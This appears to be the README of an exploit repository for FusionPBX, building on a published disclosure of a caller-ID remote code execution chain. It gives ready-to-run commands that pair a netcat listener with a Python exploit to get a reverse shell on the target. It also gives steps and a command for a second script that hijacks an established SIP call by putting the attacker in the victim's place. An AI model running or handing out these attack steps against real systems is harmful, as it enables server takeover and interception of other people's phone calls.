<h1>Prelude</h1>

This simple code tries to complete the implementation of the chained vulnerability introduced
by [Dustin Cobb](https://www.linkedin.com/in/dustin-cobb-b33ba6b9/) at [RCE Using Caller ID – Multiple Vulnerabilities In FusionPBX](https://www.aon.com/cyber-solutions/aon_cyber_labs/rce-using-caller-id-multiple-vulnerabilities-in-fusionpbx/).

<h1>RCE</h1>

<h2>Reproduction Steps</h2>

1. View the vulnerable operator screen in a web browser, located in this example at https://{fusionpbx_address}/app/operator_panel/index.php
2. Start a `netcat` listener on a remote system (rce_listener_address).x`
3. Run the exploit code below on the remote system in another terminal window `python3 .\main.py --close_rce_sockets False --attacker_address {attacker_address} --fusion_pbx_address {fusion_pbx_address} --rce_listener_address {rce_listener_address}`
4. The exploit will connect to the `netcat` listener and provide a reverse shell

<h1>Replace a call</h1>

While we know Call-ID, from-tag, and to-tag from a call, running the below code will replace you instead of the victim in the call.

<h2>Reproduction Steps</h2>

1. First initiate a call between to SIP UA.
2. After call established we need construct dialog_identifier by concatenating {Call-ID}{semicolon}"to-teg:"{to-tag}"from-tag"{from-tag}.
3. Run the hijacker code below on remote system and replace you with victim number. `python3 .\transfer.py --attacker_address {attacker_address} --fusion_pbx_address {fusion_pbx_address} --victim_number {victim_number} --dialog_identifier {dialog_identifier}`
